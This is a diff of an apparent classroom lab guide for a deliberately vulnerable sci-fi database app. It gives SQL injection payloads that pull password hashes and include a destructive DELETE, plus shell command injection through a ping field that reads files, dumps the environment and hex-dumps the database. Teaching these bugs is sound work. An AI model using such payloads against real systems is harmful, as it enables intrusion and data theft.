@@ -35,79 +35,110 @@ db.prepare(`SELECT * FROM creatures WHERE name LIKE '%${q}%'`)
 
 There is **no** parameterization and **no** escaping. Anything you type in the search box (or send as `q`) becomes part of the SQL string.
 
-On failure, the API returns `{ "rows": [], "sqlError": "<message>" }`. The UI shows **sqlError** under the search bar—useful for blind/error-based teaching.
+On failure, the API returns `{ "rows": [], "sqlError": "<message>" }`. The UI shows **sqlError** under the search bar—useful for error-based teaching.
 
-### Reconnaissance (benign)
+### What an attacker can actually do here
 
-1. Normal search: `Vorash` → one creature.
-2. Wildcard: `%` → all creatures (matches everything in `LIKE`).
-3. Trigger a syntax error: `'` → observe `sqlError` in the UI or JSON.
+| Goal | How (via this bug) |
+|------|---------------------|
+| Bypass the search filter | Break out of the `LIKE` string and force a always-true `WHERE` clause |
+| List every creature | Tautology or `%` wildcard |
+| Read the hidden **`users`** table | `UNION SELECT` to pull `username`, `password` (MD5), `clearance_level` |
+| Learn schema / DB type | Trigger SQL errors; optional `UNION` against `sqlite_master` |
+| Change data (theory) | Stacked `UPDATE`/`DELETE`—usually **blocked** by SQLite + single `prepare()`; still discuss in class |
 
-**curl example:**
+The search box is only *meant* to find creatures by name. SQLi turns it into a **general query interface** against the whole database file.
 
-```bash
-curl -s "http://localhost:3000/api/search?q=Vorash" | jq
-curl -s "http://localhost:3000/api/search?q=%25" | jq   # %25 = encoded %
-curl -s "http://localhost:3000/api/search?q=%27" | jq     # %27 = encoded '
-```
+### Payload cheat sheet (search box or `?q=`)
 
-### Boolean / tautology (return all creatures)
+| Payload | What it does | What you should see |
+|---------|----------------|---------------------|
+| `Vorash` | Normal search | 1 creature (Vorash the Hollow) in the grid |
+| `%` | `LIKE '%%'` matches every name | All **9** creatures |
+| `'` | Unclosed string → syntax error | Red **sqlError** box (e.g. incomplete input / syntax error) |
+| `' OR 1=1--` | Closes string, adds `OR 1=1`, comments out the rest | All **9** creatures (same as `%`) |
+| `' OR '1'='1'--` | Variant tautology | All **9** creatures |
+| `' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--` | Appends rows from **`users`** | **5 extra rows** in the grid: usernames in **name**, MD5 hashes in **species**, clearance in **home_planet** |
+| `' UNION SELECT 1, name, type, 4, 5, 6 FROM sqlite_master WHERE type='table'--` | Schema discovery (advanced) | Rows showing `creatures`, `users`, etc. in the result fields |
 
-Close the string and add a always-true condition. SQLite treats `--` as a line comment.
-
-**Payload (search box or `q`):**
-
-```text
-' OR 1=1--
-```
-
-**Resulting SQL (conceptually):**
+**Resulting SQL for tautology (conceptually):**
 
 ```sql
 SELECT * FROM creatures WHERE name LIKE '%' OR 1=1--%'
 ```
 
-The `--` comments out the trailing `%'` so the predicate becomes “match all rows.”
+SQLite treats `--` as a comment, so the trailing `%'` never breaks the query.
 
-**Variants to try:**
+### Step-by-step: normal use → full database leak
 
-```text
-' OR '1'='1'--
-%' OR 1=1--
+**1. Recon (benign)**
+
+```bash
+curl -s "http://localhost:3000/api/search?q=Vorash" | jq '.rows | length'
+# → 1
+
+curl -s "http://localhost:3000/api/search?q=%25" | jq '.rows | length'   # %25 = %
+# → 9
+
+curl -s "http://localhost:3000/api/search?q=%27" | jq '.sqlError'        # %27 = '
+# → non-null error message
 ```
 
-### UNION-based extraction (`users` table)
-
-`creatures` has **6** columns. A `UNION SELECT` must supply six expressions.
-
-**Payload:**
+**2. Bypass filter (paste in Search portal)**
 
 ```text
-' UNION SELECT id, username, password, danger_level, clearance_level, '' FROM users--
+' OR 1=1--
 ```
 
-(`danger_level` is numeric in schema; usernames/passwords appear in `name` / `species` / `clearance_level` fields in the JSON/UI—map columns creatively in class.)
+**What happens:** The app still looks like a “search,” but the query returns **every creature** regardless of name. Proves input controls SQL logic, not just the search term.
 
-**Cleaner column alignment** (cast numeric id, empty description):
+**3. Steal operator accounts (`users` table)**
+
+`creatures` returns **6** columns: `id`, `name`, `species`, `danger_level`, `home_planet`, `description`.  
+`UNION SELECT` must supply **6** values.
+
+**Payload (paste in Search portal):**
 
 ```text
 ' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--
 ```
 
+**How results appear in the UI** (column mapping):
+
+| DB column (`users`) | Shows up in creature card field |
+|---------------------|----------------------------------|
+| `username` | **name** (e.g. `agent_kane`) |
+| `password` (MD5 hex) | **species** (e.g. `9999d3f3a0d39a3d80ca3fe21c455678`) |
+| `clearance_level` | **home_planet** (e.g. `Omega-Black`) |
+| literal `'leaked'` | **description** |
+
 **curl:**
 
 ```bash
 curl -s --get "http://localhost:3000/api/search" \
-  --data-urlencode "q=' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--" | jq
+  --data-urlencode "q=' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--" \
+  | jq '.rows[] | {name, species, home_planet}'
 ```
 
-Students should see rows such as `agent_kane` with MD5 `password` hashes. Cross-reference plaintext hints in [README.md](README.md) (e.g. `nebula-agent` → `9999d3f3a0d39a3d80ca3fe21c455678`).
+**What students do with the hashes:** Look up plaintext in [§7](#7-seeded-credentials-post-exfiltration) or crack MD5 offline (e.g. `nebula-agent` → `9999d3f3a0d39a3d80ca3fe21c455678`).
+
+**4. Optional: list tables (schema enumeration)**
+
+```text
+' UNION SELECT 1, name, type, 4, 5, 6 FROM sqlite_master WHERE type='table'--
+```
+
+**What happens:** Result rows expose table names (`creatures`, `users`)—useful to explain how attackers map a unknown app to your DB.
 
 ### Stacked queries / destructive payloads
 
-**Do not run in shared labs without explicit permission.** SQLite + `better-sqlite3` may reject or ignore stacked statements depending on API usage; still worth discussing why production apps must never allow multi-statement input.
+**Do not run in shared labs without permission.** Example discussed in class only:
 
-Teaching point: even read-only-looking search boxes can become data exfiltration or integrity breaks when SQL is concatenated.
+```text
+'; DELETE FROM creatures; --
+```
+
+With a single `db.prepare(...).all()` call, SQLite often **rejects** multi-statement input—but production apps using different drivers may not. Teaching point: never trust “read-only” UI labels.
 
 ### Remediation talking points
 
@@ -127,50 +158,82 @@ The server runs:
 exec(`ping -c 4 ${host}`, ...)
 ```
 
-(`host` comes from JSON `target` via `runRelayPing()`.) `child_process.exec` invokes a shell (`/bin/sh -c …` on Unix). Metacharacters in `target` can chain arbitrary commands.
+(`host` comes from JSON `target` via `runRelayPing()`.) `child_process.exec` invokes a shell (`/bin/sh -c …` on Unix). Metacharacters in `target` can chain **arbitrary shell commands**, not just ping.
 
 Output is returned as JSON `{ stdout, stderr, error }` and rendered in **Raw terminal stream** in the sidebar.
 
-### Reconnaissance (benign)
+**This is command injection (CWE-78), not SSRF.** The app does not `fetch()` a URL; it runs a shell command. Chaining `curl` would be CMDi *enabling* HTTP requests, not classic SSRF from ping alone.
+
+### What an attacker can actually do here
+
+| Goal | Example approach |
+|------|------------------|
+| Prove arbitrary command execution | `127.0.0.1; whoami` |
+| Read files on the server | `127.0.0.1; cat package.json` |
+| Map the filesystem | `127.0.0.1; pwd` and `127.0.0.1; ls -la` |
+| Exfiltrate env / secrets | `127.0.0.1; env` (if present in process env) |
+| Probe localhost | `127.0.0.1; ping -c 1 127.0.0.1` (redundant but shows control) |
+
+In production, the same bug often leads to reverse shells, credential theft, or cloud metadata access (`curl` to `169.254.169.254`)—**only demonstrate safe, read-only commands in class.**
+
+### Payload cheat sheet (Planet connectivity field or JSON `target`)
+
+| Payload (`target`) | What it does | What you should see in **Raw terminal stream** |
+|--------------------|----------------|--------------------------------------------------|
+| `127.0.0.1` | Legitimate ping | `ping` statistics (packets, round-trip time) |
+| `8.8.8.8` | Ping public DNS | Normal ping output to Google DNS |
+| `127.0.0.1; whoami` | Ping, then print OS user | Ping output **plus** a line like `mackenzie` or `www-data` |
+| `127.0.0.1; id` | Ping, then user/group ids | Ping output plus `uid=... gid=...` |
+| `127.0.0.1; pwd` | Print working directory | Path to the Next.js process cwd (project root when running `npm run dev`) |
+| `127.0.0.1; ls -la` | List directory | File listing mixed after ping output |
+| `127.0.0.1; ls -la data` | List SQLite folder | `galactic.db` and related files |
+| `127.0.0.1; cat package.json` | Read app manifest | JSON of `package.json` in the output |
+| `127.0.0.1 && whoami` | Run `whoami` only if ping succeeds | Same as semicolon variant when ping works |
+| `$(whoami)` | Command substitution | Shell runs `whoami` **instead of** a normal ping target string |
+
+**UI:** paste into **Check planet connectivity** → **Run relay ping**.
+
+### Step-by-step: ping → shell
+
+**1. Baseline (benign)**
 
 ```bash
 curl -s -X POST http://localhost:3000/api/ping \
   -H "Content-Type: application/json" \
-  -d '{"target":"127.0.0.1"}' | jq
+  -d '{"target":"127.0.0.1"}' | jq -r '.stdout'
 ```
 
-You should see normal `ping` statistics in `stdout`.
+**What happens:** Four ICMP echo replies (macOS/Linux `ping -c 4`). Confirms the feature works before attacking it.
 
-### Command chaining (Unix / macOS lab)
-
-| Technique | Example `target` | Effect |
-|-----------|------------------|--------|
-| Semicolon | `127.0.0.1; whoami` | Run `whoami` after ping |
-| AND | `127.0.0.1 && id` | Second command if first succeeds |
-| Pipe | `127.0.0.1 \| uname -a` | Pipe ping output (noisy); often use `;` instead |
-| Subshell | `$(whoami)` | Inject via command substitution |
-| Newline | `127.0.0.1` + newline + `id` | Second line interpreted by shell |
-
-**UI:** enter in the planet connectivity field, click **Run relay ping**.
-
-**curl examples:**
+**2. Prove command chaining**
 
 ```bash
-# List project directory (adjust path for your machine)
 curl -s -X POST http://localhost:3000/api/ping \
   -H "Content-Type: application/json" \
-  -d '{"target":"127.0.0.1; ls -la"}' | jq -r '.stdout, .stderr'
-
-curl -s -X POST http://localhost:3000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target":"127.0.0.1; pwd"}' | jq
-
-curl -s -X POST http://localhost:3000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target":"127.0.0.1 && whoami"}' | jq
+  -d '{"target":"127.0.0.1; whoami"}' | jq -r '.stdout, .stderr'
 ```
 
-Discuss why `ping` output and injected command output may appear together in `stdout`.
+**What happens:** The shell runs roughly:
+
+```bash
+ping -c 4 127.0.0.1; whoami
+```
+
+Students see **ping output and their username** in the same box—proof the server executed their command.
+
+**3. Read app data from disk**
+
+```bash
+curl -s -X POST http://localhost:3000/api/ping \
+  -H "Content-Type: application/json" \
+  -d '{"target":"127.0.0.1; cat data/galactic.db | xxd | head -5"}' | jq -r '.stdout'
+```
+
+**What happens:** Binary/garbled output or hex dump of the SQLite file—shows the ping “utility” can touch sensitive files. (Use a simpler `ls -la data` for younger groups.)
+
+**4. Discuss impact**
+
+The sidebar was labeled “connectivity check,” but the backend is a **remote shell** with training wheels. In AWS/Lambda hosting this would be catastrophic; locally it demonstrates why `exec` + user input is forbidden.
 
 ### Windows labs
 
@@ -206,21 +269,24 @@ Default code uses `ping -c 4` (Linux/macOS). On Windows, change the route to `pi
 
 ## 5. Quick reference payloads
 
-### SQLi (paste into Search portal)
+### SQLi — Search portal (`?q=`)
 
-```text
-%
-' OR 1=1--
-' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--
-```
+| Payload | Outcome |
+|---------|---------|
+| `%` | All 9 creatures |
+| `'` | SQL error in UI |
+| `' OR 1=1--` | All 9 creatures (filter bypass) |
+| `' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--` | 5 user rows with MD5 passwords in the grid |
 
-### Command injection (paste into Planet connectivity)
+### Command injection — Planet connectivity (`target`)
 
-```text
-127.0.0.1; whoami
-127.0.0.1; ls -la
-127.0.0.1 && pwd
-```
+| Payload | Outcome |
+|---------|---------|
+| `127.0.0.1` | Normal ping |
+| `127.0.0.1; whoami` | Ping + OS username |
+| `127.0.0.1; pwd` | Ping + current directory |
+| `127.0.0.1; ls -la` | Ping + directory listing |
+| `127.0.0.1; cat package.json` | Ping + app `package.json` contents |
 
 ---
 
